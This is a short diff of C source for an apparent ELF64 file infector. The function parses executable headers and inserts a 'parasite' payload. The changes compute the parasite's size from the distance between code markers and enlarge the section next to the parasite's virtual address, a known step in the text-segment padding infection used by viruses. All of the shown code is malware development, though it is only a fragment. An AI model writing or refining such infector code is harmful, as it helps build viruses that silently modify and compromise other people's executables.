@@ -789,7 +789,8 @@ int do_the_job(char buff[],size_t size, char *path)
 	Elf64_Ehdr          *header;
 	Elf64_Phdr*             seg;
 	Elf64_Shdr*             sec;
-	size_t      parasite_size = 690;
+	unsigned int parasite_size = ((char *)&myend - (char *)&real_start )+ 7;
+
 	Elf64_Addr text;
 	Elf64_Addr parasite_vaddr;
 	Elf64_Addr old_e_entry;
@@ -902,8 +903,8 @@ int do_the_job(char buff[],size_t size, char *path)
 		else
 		if (sec->sh_size + sec->sh_addr == parasite_vaddr)
 		{
-			//sec->sh_size += parasite_size;
-			sec->sh_size += PAGE_SIZE;
+			sec->sh_size += parasite_size;
+			//sec->sh_size += PAGE_SIZE;
 		}
 	}
 	header->e_shoff += PAGE_SIZE;
